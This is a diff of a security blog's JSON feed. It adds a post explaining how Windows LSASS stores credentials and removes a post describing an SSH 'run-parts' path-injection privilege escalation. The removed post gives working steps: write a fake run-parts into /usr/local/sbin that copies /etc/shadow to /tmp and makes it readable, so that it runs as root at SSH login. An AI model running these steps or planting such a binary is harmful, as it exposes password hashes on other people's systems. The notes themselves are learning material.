@@ -17,6 +17,30 @@
 "items": [
     
         {
+            "id": "https://mvineza.github.io/spindel/2022/05/03/lsa-secrets",
+            "title": "LSA Secrets",
+            "summary": "LSA Secrets",
+            "content_text": "OverviewLSA secrets is a special protected storage for important data used by the Local Security Authority (LSA) in Windows. LSA is designed for managing a system’s local security policy, auditing, authenticating, logging users on to the system, storing private data. Users’ and system’s sensitive data is stored in secrets. Access to all secret data is available to system only.LSASS (Local Security Authority Subsystem Service) is the service corresponding to this and it stores the credentials in memory on behalf of user that has an active session.LSASS may store credentials in multiple forms, including reversibly encrypted password, Kerberos tickets, NT hash, LM hash, DPAPI keys,and Smartcard PIN.Credentials are stored in LSASS for sessions that have been established since the last reboot and have not been closed. For example, credentials are created in memory when a user does any of the following (this is not an exhaustive list).  Logs on to a local session or RDP session on the computer  Runs a process using RunAs  Runs an active Windows service on the computer  Creates a scheduled task or batch job.  Runs PsExec with explicit creds, such as PsExec \\\\server -u user -p pwd cmd  Uses WinRM with CredSSP.References  Dumping LSA Secrets - Red Teaming Experiments  Windows LSA secrets  Decrypting LSA Secrets",
+            "content_html": "<h2 id=\"overview\">Overview</h2><p>LSA secrets is a special protected storage for important data used by the Local Security Authority (LSA) in Windows. LSA is designed for managing a system’s local security policy, auditing, authenticating, logging users on to the system, storing private data. Users’ and system’s sensitive data is stored in secrets. Access to all secret data is available to system only.</p><p>LSASS (Local Security Authority Subsystem Service) is the service corresponding to this and it stores the credentials in memory on behalf of user that has an active session.</p><p>LSASS may store credentials in multiple forms, including reversibly encrypted password, Kerberos tickets, NT hash, LM hash, DPAPI keys,and Smartcard PIN.</p><p>Credentials are stored in LSASS for sessions that have been established since the last reboot and have not been closed. For example, credentials are created in memory when a user does any of the following (this is not an exhaustive list).</p><ul>  <li>Logs on to a local session or RDP session on the computer</li>  <li>Runs a process using RunAs</li>  <li>Runs an active Windows service on the computer</li>  <li>Creates a scheduled task or batch job.</li>  <li>Runs PsExec with explicit creds, such as <code class=\"language-plaintext highlighter-rouge\">PsExec \\\\server -u user -p pwd cmd</code></li>  <li>Uses WinRM with CredSSP.</li></ul><h2 id=\"references\">References</h2><ul>  <li><a href=\"https://www.ired.team/offensive-security/credential-access-and-credential-dumping/dumping-lsa-secrets\">Dumping LSA Secrets - Red Teaming Experiments</a></li>  <li><a href=\"https://www.passcape.com/index.php?section=docsys&amp;cmd=details&amp;id=23\">Windows LSA secrets</a></li>  <li><a href=\"http://moyix.blogspot.com/2008/02/decrypting-lsa-secrets.html\">Decrypting LSA Secrets</a></li></ul>",
+            "url": "https://mvineza.github.io/spindel/2022/05/03/lsa-secrets",
+            
+            
+            
+            "tags": ["windows","crypto"],
+            
+            "date_published": "2022-05-03T00:00:00+08:00",
+            "date_modified": "2022-05-03T00:00:00+08:00",
+            
+                "author":  {
+                "name": "spindel",
+                "url": null,
+                "avatar": null
+                }
+                
+            
+        },
+    
+        {
             "id": "https://mvineza.github.io/spindel/2022/05/01/dns-domain-name-system",
             "title": "DNS (Domain Name System)",
             "summary": "DNS (Domain Name System)",
@@ -846,30 +870,6 @@
             
             "date_published": "2022-02-25T00:00:00+08:00",
             "date_modified": "2022-02-25T00:00:00+08:00",
-            
-                "author":  {
-                "name": "spindel",
-                "url": null,
-                "avatar": null
-                }
-                
-            
-        },
-    
-        {
-            "id": "https://mvineza.github.io/spindel/2022/02/23/ssh-run-parts",
-            "title": "SSH run-parts",
-            "summary": "SSH run-parts",
-            "content_text": "Overviewrun-parts is being run by root whenever a successful ssh login completes. Attacker can crafyt a malicious run-parts binary if he can override system paths such as /usr/local/sbin.This is a type of path injection attack.Steps  Ensure you have write permission to /usr/local/sbin  Use pspy  to monitor the process inside victim machine. Open another terminal and SSH to victim again.$ ./pspy -f[...redacted...]2021/11/05 23:59:17 CMD: UID=0    PID=2090   | sh -c /usr/bin/env -i PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin run-parts --lsbsysinit /etc/update-motd.d &gt; /run/motd.dynamic.new [...redacted...]# 2 things to notice:#  - run-parts is not using full path#  - it is running as UID=0 which is root  Craft malicuous binaryecho '#!/bin/bash' &gt; /usr/local/sbin/run-partsecho 'cp /etc/shadow /tmp; chmod +r /tmp/shadow' &gt; /usr/local/sbin/run-parts  Try SSH login again. You should be able to read now the shadow file.Some takewaysEven on modern linux systems, run-parts still have this behaviour. As an example, here is what I saw from my kali machine.➜  linux cat /etc/crontab | grep run-parts17 *\t* * *\troot    cd / &amp;&amp; run-parts --report /etc/cron.hourly25 6\t* * *\troot\ttest -x /usr/sbin/anacron || ( cd / &amp;&amp; run-parts --report /etc/cron.daily )47 6\t* * 7\troot\ttest -x /usr/sbin/anacron || ( cd / &amp;&amp; run-parts --report /etc/cron.weekly )52 6\t1 * *\troot\ttest -x /usr/sbin/anacron || ( cd / &amp;&amp; run-parts --report /etc/cron.monthly )➜  linux",
-            "content_html": "<h2 id=\"overview\">Overview</h2><p><code class=\"language-plaintext highlighter-rouge\">run-parts</code> is being run by root whenever a successful ssh login completes. Attacker can crafyt a malicious <code class=\"language-plaintext highlighter-rouge\">run-parts</code> binary if he can override system paths such as <code class=\"language-plaintext highlighter-rouge\">/usr/local/sbin</code>.</p><p>This is a type of path injection attack.</p><h2 id=\"steps\">Steps</h2><ul>  <li>Ensure you have write permission to <code class=\"language-plaintext highlighter-rouge\">/usr/local/sbin</code></li>  <li>Use <code class=\"language-plaintext highlighter-rouge\">pspy</code>  to monitor the process inside victim machine. Open another terminal and SSH to victim again.</li></ul><div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"nv\">$ </span>./pspy <span class=\"nt\">-f</span><span class=\"o\">[</span>...redacted...]2021/11/05 23:59:17 CMD: <span class=\"nv\">UID</span><span class=\"o\">=</span>0    <span class=\"nv\">PID</span><span class=\"o\">=</span>2090   | sh <span class=\"nt\">-c</span> /usr/bin/env <span class=\"nt\">-i</span> <span class=\"nv\">PATH</span><span class=\"o\">=</span>/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin run-parts <span class=\"nt\">--lsbsysinit</span> /etc/update-motd.d <span class=\"o\">&gt;</span> /run/motd.dynamic.new <span class=\"o\">[</span>...redacted...]<span class=\"c\"># 2 things to notice:</span><span class=\"c\">#  - run-parts is not using full path</span><span class=\"c\">#  - it is running as UID=0 which is root</span></code></pre></div></div><ul>  <li>Craft malicuous binary</li></ul><div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"nb\">echo</span> <span class=\"s1\">'#!/bin/bash'</span> <span class=\"o\">&gt;</span> /usr/local/sbin/run-parts<span class=\"nb\">echo</span> <span class=\"s1\">'cp /etc/shadow /tmp; chmod +r /tmp/shadow'</span> <span class=\"o\">&gt;</span> /usr/local/sbin/run-parts</code></pre></div></div><ul>  <li>Try SSH login again. You should be able to read now the shadow file.</li></ul><h2 id=\"some-takeways\">Some takeways</h2><p>Even on modern linux systems, <code class=\"language-plaintext highlighter-rouge\">run-parts</code> still have this behaviour. As an example, here is what I saw from my kali machine.</p><div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code>➜  linux <span class=\"nb\">cat</span> /etc/crontab | <span class=\"nb\">grep </span>run-parts17 <span class=\"k\">*</span>\t<span class=\"k\">*</span> <span class=\"k\">*</span> <span class=\"k\">*</span>\troot    <span class=\"nb\">cd</span> / <span class=\"o\">&amp;&amp;</span> run-parts <span class=\"nt\">--report</span> /etc/cron.hourly25 6\t<span class=\"k\">*</span> <span class=\"k\">*</span> <span class=\"k\">*</span>\troot\t<span class=\"nb\">test</span> <span class=\"nt\">-x</span> /usr/sbin/anacron <span class=\"o\">||</span> <span class=\"o\">(</span> <span class=\"nb\">cd</span> / <span class=\"o\">&amp;&amp;</span> run-parts <span class=\"nt\">--report</span> /etc/cron.daily <span class=\"o\">)</span>47 6\t<span class=\"k\">*</span> <span class=\"k\">*</span> 7\troot\t<span class=\"nb\">test</span> <span class=\"nt\">-x</span> /usr/sbin/anacron <span class=\"o\">||</span> <span class=\"o\">(</span> <span class=\"nb\">cd</span> / <span class=\"o\">&amp;&amp;</span> run-parts <span class=\"nt\">--report</span> /etc/cron.weekly <span class=\"o\">)</span>52 6\t1 <span class=\"k\">*</span> <span class=\"k\">*</span>\troot\t<span class=\"nb\">test</span> <span class=\"nt\">-x</span> /usr/sbin/anacron <span class=\"o\">||</span> <span class=\"o\">(</span> <span class=\"nb\">cd</span> / <span class=\"o\">&amp;&amp;</span> run-parts <span class=\"nt\">--report</span> /etc/cron.monthly <span class=\"o\">)</span>➜  linux</code></pre></div></div>",
-            "url": "https://mvineza.github.io/spindel/2022/02/23/ssh-run-parts",
-            
-            
-            
-            "tags": ["linux","privesc"],
-            
-            "date_published": "2022-02-23T00:00:00+08:00",
-            "date_modified": "2022-02-23T00:00:00+08:00",
             
                 "author":  {
                 "name": "spindel",
